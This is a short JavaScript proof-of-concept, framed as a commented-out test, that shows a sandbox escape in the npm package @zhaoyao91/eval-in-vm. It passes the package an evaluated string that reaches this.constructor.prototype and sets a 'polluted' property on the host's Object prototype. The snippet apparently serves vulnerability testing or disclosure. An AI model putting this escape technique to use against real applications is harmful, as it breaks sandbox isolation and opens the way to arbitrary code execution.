// test("Arbitrary code execution in @zhaoyao91/eval-in-vm", () => {
//   expect.assertions(2);
  const eval1 = require("@zhaoyao91/eval-in-vm");
console.log({}.polluted);
  try {
    ("use strict");
    const result = eval1("1 + (this.constructor.prototype.polluted = `yes`);");
  } catch (error) {}
console.log({}.polluted);
// });
